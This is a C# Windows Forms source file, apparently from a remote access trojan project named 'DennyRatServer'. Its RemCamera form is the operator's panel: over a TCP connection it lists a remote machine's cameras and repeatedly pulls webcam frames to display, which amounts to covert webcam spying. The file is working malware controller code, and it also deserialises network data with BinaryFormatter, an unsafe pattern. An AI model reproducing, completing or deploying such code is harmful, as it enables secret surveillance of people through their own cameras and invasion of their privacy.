using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using AForge.Video;
using AForge.Video.DirectShow;
using AForge.Video.FFMPEG;
using AForge.Video.VFW;
using Newtonsoft.Json;

namespace DennyRatServer
{
    public partial class RemCamera : Form
    {
        TcpClient cli;
        private NetworkStream mainStream;

        string devname = "none";

        public RemCamera(TcpClient client)
        {
            cli = client;
            InitializeComponent();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            timer1.Enabled = false;
            SendCommand("clearcams");

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            button2.Text = "Start Streaming";
            pictureBox1.Image = null;
            timer1.Enabled = false;
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendCommand("getcam:" + devname);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            Image stre = (Image)binFormatter.Deserialize(mainStream);

            pictureBox1.Image = stre;

            //pictureBox1.Image = stre;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(devname == "none")
            {
                MessageBox.Show("No Device Selected");
                return;
            }

            if (button2.Text.ToLower().StartsWith("stop"))
            {
                SendCommand("clearcams");

                BinaryFormatter binFormatter = new BinaryFormatter();

                mainStream = cli.GetStream();
                string stre = (string)binFormatter.Deserialize(mainStream);

                button2.Text = "Start Streaming";
                pictureBox1.Image = null;
                timer1.Enabled = false;
                return;
            }

            if (button2.Text.ToLower().StartsWith("start"))
            {
                button2.Text = "Stop Streaming";
                timer1.Enabled = true;
                return;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendCommand("getpossiblecams");

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            string b = Prompt.ShowDialog("Devices", "Choose Device To Use", stre);
            devname = b;
        }
    }
}
